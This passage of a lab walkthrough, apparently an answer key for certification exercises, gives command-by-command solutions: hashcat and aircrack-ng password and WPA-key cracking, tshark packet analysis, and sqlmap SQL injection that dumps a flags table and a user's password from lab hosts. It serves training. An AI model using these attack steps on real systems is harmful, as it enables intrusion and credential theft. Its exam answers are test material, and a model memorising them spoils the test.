3. `hashcat -m 13711 h.txt /usr/share/wordlists/rockyou.txt` → cracked → `Tr0ub4dor` (the volume password in plaintext).
4. `sudo veracrypt -t --mount secret /mnt/vc --password='Tr0ub4dor' --pim=0 --protect-hidden=no` → mounts (PIM 0 = default; if it fails, try `--pim=` from the hash's variant).
5. `cat /mnt/vc/confidential.txt` → the secret code.
6. `sudo veracrypt -t -d /mnt/vc` → always unmount.

⇒ Answer: the content of `confidential.txt`.

## Lab 17 — IoT publish message length

1. `capinfos iot.pcap` → ~4 800 packets, MQTT on `1883`.
2. `tshark -r iot.pcap -Y 'mqtt.msgtype==3' -T fields -e frame.number -e mqtt.topic -e mqtt.len` → dozens of PUBLISH rows across several topics.
3. The row you want is the publish carrying a real payload, e.g. `612  /factory/line1  39` — `mqtt.len` is the **message length**.
4. Cross-check in Wireshark: the frame is 71 bytes on the wire, but the MQTT Message Length field says 39 — the question asks for the message, not the frame.

⇒ Answer: `39`.

## Lab 18 — Rogue AP: crack the WPA key

1. `aircrack-ng 'wireless capture.cab'` → `WPA (1 handshake)` against one BSSID — a crackable capture, so no need to capture your own.
2. `aircrack-ng 'wireless capture.cab' -w /usr/share/wordlists/rockyou.txt` → `KEY FOUND! [ Password1 ]` after ~2 s.
3. If it had reported `PMKID` instead of a handshake, the route changes to `hcxpcaptool -z` + `hashcat -m 22000`.
4. The honeypot half of the lab (airbase-ng / wifiphisher) is a separate deliverable — it does not produce this answer.

⇒ Answer: `Password1` (the passphrase, not the handshake or the BSSID).

## Lab 19 — DDoS: which IP sent the most packets

1. `capinfos 'attack traffic pcapng'` → ~210 000 packets, all toward `10.10.1.10`.
2. `tshark -r 'attack traffic pcapng' -q -z endpoints,ip` → table ordered by packets: `172.20.0.01  98 412`, `172.20.0.07  41 003`, `172.20.0.15  22 890`.
3. `tshark -r ... -Y 'ip.dst==10.10.1.10' -T fields -e ip.src | sort | uniq -c | sort -rn | head -3` → same ranking, independent of the endpoint view.
4. Note what the ranking is **by**: packets. Sorting the same table by bytes can put a different host first — that host is the wrong answer here.

⇒ Answer: `172.20.0.01`.

## Lab 20 — SQLi on `cybersec.cehorg.com` → `flag` column

1. `whatweb -a 3 http://cybersec.cehorg.com` → PHP app with a `?id=` link in the nav — the parameter to test.
2. `curl -s 'http://cybersec.cehorg.com/?id=1'` → row renders; `curl -s "http://cybersec.cehorg.com/?id=1'"` → HTTP 500 → injectable.
3. `sqlmap -u 'http://cybersec.cehorg.com/?id=1' --batch --dbs` → `cybersec`, `information_schema`.
4. `--tables -D cybersec` → `users`, `flags`, `logs` — `flags` is the one the question names.
5. `-T flags --dump` → `1 | CYBER{...}` — the value inside the `flag` column.

⇒ Answer: that value. (`--dump-all` would return the same string after ten minutes of noise.)

## Lab 21 — SQLi on `cinema.cehorg.com` → Sarah's password

1. Log in as `Karen/computers` — the question states the account exists, which tells you the injectable parameter is behind authentication.
2. The profile/booking page carries `?user_id=12`; `?user_id=12'` → HTTP 500 → injectable, and only after login.
3. `sqlmap -u 'http://cinema.cehorg.com/?user_id=12' --batch --cookie='PHPSESSID=<session>' --dbs` → the app database.
4. `--sql-query "SELECT password FROM users WHERE username='Sarah'"` → one row.
5. If that row is a hash, run it through `hashid -m` → `hashcat -m <mode>` before answering; the question asks for the password, not the digest.

⇒ Answer: Sarah's password (plaintext — cracked first if the dump returns a hash).
